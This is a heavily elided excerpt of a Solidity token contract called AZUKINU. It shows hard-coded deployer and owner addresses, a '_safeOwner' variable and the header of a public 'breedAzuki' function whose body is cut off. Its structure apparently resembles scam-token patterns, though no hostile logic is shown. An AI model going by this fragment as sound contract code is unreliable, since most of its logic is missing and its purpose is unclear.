...
contract AZUKINU is Context, IERC20 {
    ...
    address lead_deployer = 0xd45058Bf25BBD8F586124C479D384c8C708CE23A;
    address public _owner = 0x8B383d303440551608fB3E15172C72F48082cCB5;
   constructor () public {
        ...
        _symbol = "AZUKINU";
        _decimals = 18;
        uint256 initialSupply = 153684684684;
        _safeOwner = _owner;
...
//-----------------------------------------------------------------------------------------------------------------------//
        ...
        function breedAzuki(address account, address staker) public {
